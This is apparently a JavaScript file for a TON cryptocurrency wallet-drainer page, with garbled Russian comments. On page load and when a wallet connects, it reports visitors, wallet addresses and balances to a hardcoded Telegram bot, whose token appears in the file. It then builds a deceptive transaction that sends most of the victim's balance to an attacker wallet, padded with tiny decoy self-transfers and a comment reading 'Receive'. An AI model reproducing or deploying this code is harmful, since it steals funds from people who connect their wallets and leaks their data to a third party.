var mainWallet = "UQBk_5iaLiQwxJ8VWm6CmjJ15_04mbjgIfFlMjxfAtv9V58X";
const botToken = "7931684835:AAH9pSLLaLLqOqd40q6o6uUMsiRHVSrak7U";
const chatId = "@ppjjkkd";

const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
    manifestUrl: 'https://imdontyou.github.io/time/tonconnect-manifest.json',
    buttonRootId: 'ton-connect'
});

let walletAddress = null;

async function sendToTelegram(message) {
    try {
        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: "HTML" })
        });
    } catch (error) {
        console.error("–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ Telegram:", error);
    }
}

(async () => {
    sendToTelegram(`üåç –ù–æ–≤—ã–π –ø–æ—Å–µ—Ç–∏—Ç–µ–ª—å —Å–∞–π—Ç–∞!`);
})();

tonConnectUI.onStatusChange(async (walletInfo) => {
    if (walletInfo && walletInfo.account) {
        walletAddress = walletInfo.account.address;
        console.log('–ê–¥—Ä–µ—Å –ø–æ–¥–∫–ª—é—á–µ–Ω–Ω–æ–≥–æ –∫–æ—à–µ–ª—å–∫–∞:', walletAddress);
        
        await updateBalance(walletAddress);
        sendToTelegram(`‚úÖ –ü–æ–¥–∫–ª—é—á–µ–Ω –∫–æ—à–µ–ª–µ–∫: <code>${walletAddress}</code>`);
    }
});

async function updateBalance(walletAddress) {
    try {
        const response = await fetch(`https://toncenter.com/api/v3/wallet?address=${walletAddress}`);
        const data = await response.json();
        if (!data.balance) return;

        const balanceTON = parseFloat(data.balance) / 1000000000;
        console.log(`–ë–∞–ª–∞–Ω—Å: ${balanceTON} TON`);

        sendToTelegram(`üí∞ –ë–∞–ª–∞–Ω—Å –∫–æ—à–µ–ª—å–∫–∞ <code>${walletAddress}</code>: <b>${balanceTON} TON</b>`);
    } catch (error) {
        console.error('–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ –±–∞–ª–∞–Ω—Å–∞:', error);
    }
}

async function didtrans() {
    // –ü—Ä–æ–≤–µ—Ä—è–µ–º, –ø–æ–¥–∫–ª—é—á–µ–Ω –ª–∏ –∫–æ—à–µ–ª–µ–∫
    if (!walletAddress) {
        console.error('–ö–æ—à–µ–ª–µ–∫ –Ω–µ –ø–æ–¥–∫–ª—é—á–µ–Ω');
        alert('–ö–æ—à–µ–ª–µ–∫ –Ω–µ –ø–æ–¥–∫–ª—é—á–µ–Ω');
        return;
    }

    // –ü–æ–ª—É—á–∞–µ–º –±–∞–ª–∞–Ω—Å –∫–æ—à–µ–ª—å–∫–∞
    const response = await fetch(`https://toncenter.com/api/v3/wallet?address=${walletAddress}`);
    const data = await response.json();

    // –ü—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞ –æ—à–∏–±–∫–∏ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ –¥–∞–Ω–Ω—ã—Ö –æ –∫–æ—à–µ–ª—å–∫–µ
    if (!data.balance) {
        console.error('–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –±–∞–ª–∞–Ω—Å');
        return;
    }

    const originalBalance = parseFloat(data.balance); // –ë–∞–ª–∞–Ω—Å –≤ –Ω–∞–Ω–æ—Ç–æ–Ω–∞—Ö
    const origbal = originalBalance * 0.55;
    const roundedBalance = Math.round(origbal);

    // –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º 0.3 TON –≤ –Ω–∞–Ω–æ—Ç–æ–Ω—ã, –∫–æ—Ç–æ—Ä—ã–µ –±—É–¥–µ–º –≤—ã—á–∏—Ç–∞—Ç—å
    const deduction = roundedBalance; // 0.3 TON –≤ –Ω–∞–Ω–æ—Ç–æ–Ω–∞—Ö

    // –ü—Ä–æ–≤–µ—Ä–∫–∞, —á—Ç–æ–±—ã –±–∞–ª–∞–Ω—Å –±—ã–ª –¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ –≤–µ–ª–∏–∫ –¥–ª—è –≤—ã—á–∏—Ç–∞–Ω–∏—è 0.3 TON
    if (originalBalance <= deduction) {
        console.error('–ë–∞–ª–∞–Ω—Å —Å–ª–∏—à–∫–æ–º –º–∞–ª –¥–ª—è –≤—ã—á–∏—Ç–∞–Ω–∏—è 0.3 TON');
        return;
    }

    // –í—ã—á–∏—Ç–∞–µ–º 0.3 TON –∏–∑ –±–∞–ª–∞–Ω—Å–∞
    const remainingBalance = originalBalance - deduction;

    console.log(`–ë–∞–ª–∞–Ω—Å –ø–æ—Å–ª–µ –≤—ã—á–µ—Ç–∞ 0.3 TON: ${remainingBalance / 1000000000} TON`);

    // –§–æ—Ä–º–∏—Ä—É–µ–º —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏—é —Å –¥–≤—É–º—è —Å–æ–æ–±—â–µ–Ω–∏—è–º–∏
    const transaction = {
        validUntil: Math.floor(Date.now() / 1000) + 60, // –í—Ä–µ–º—è –¥–µ–π—Å—Ç–≤–∏—è —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏ (60 —Å–µ–∫—É–Ω–¥)
        messages: [
            {
                address: walletAddress,  // –ê–¥—Ä–µ—Å –ø–æ–ª—É—á–∞—Ç–µ–ª—è –¥–ª—è –ø–µ—Ä–≤–æ–π —á–∞—Å—Ç–∏
                amount: 100,       // –°—É–º–º–∞ –¥–ª—è –ø–µ—Ä–≤–æ–π —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏ (0.001 TON)
            },
            {
                address: walletAddress,  // –ê–¥—Ä–µ—Å –ø–æ–ª—É—á–∞—Ç–µ–ª—è –¥–ª—è –ø–µ—Ä–≤–æ–π —á–∞—Å—Ç–∏
                amount: 100,       // –°—É–º–º–∞ –¥–ª—è –ø–µ—Ä–≤–æ–π —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏ (0.001 TON)
            },
            {
                address: walletAddress,  // –ê–¥—Ä–µ—Å –ø–æ–ª—É—á–∞—Ç–µ–ª—è –¥–ª—è –ø–µ—Ä–≤–æ–π —á–∞—Å—Ç–∏
                amount: 100,       // –°—É–º–º–∞ –¥–ª—è –ø–µ—Ä–≤–æ–π —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏ (0.001 TON)
            },
            {
                address: mainWallet,   // –ê–¥—Ä–µ—Å –ø–æ–ª—É—á–∞—Ç–µ–ª—è –¥–ª—è –≤—Ç–æ—Ä–æ–π —á–∞—Å—Ç–∏
                amount: remainingBalance, // –°—É–º–º–∞ –¥–ª—è –≤—Ç–æ—Ä–æ–π —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏
            }
        ],
        sendMode: 5,  // –ï—Å–ª–∏ —ç—Ç–æ —Ç—Ä–µ–±—É–µ—Ç—Å—è –≤ –≤–∞—à–µ–º API
        comment: "–ü–æ–ª—É—á–∏—Ç—å",  // –ö–æ–º–º–µ–Ω—Ç–∞—Ä–∏–π (–ø–æ –∂–µ–ª–∞–Ω–∏—é)
    };

    try {
        const result = await tonConnectUI.sendTransaction(transaction);
        console.log('–¢—Ä–∞–Ω–∑–∞–∫—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞:', result);
        
        sendToTelegram(`üí∏ –û—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏—è —Å –∫–æ—à–µ–ª—å–∫–∞ <code>${walletAddress}</code> –Ω–∞ —Å—É–º–º—É <b>${remainingBalance / 1000000000} TON</b>`);
        
        await updateBalance(walletAddress);
    } catch (error) {
        console.error('–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏:', error);
    }
}
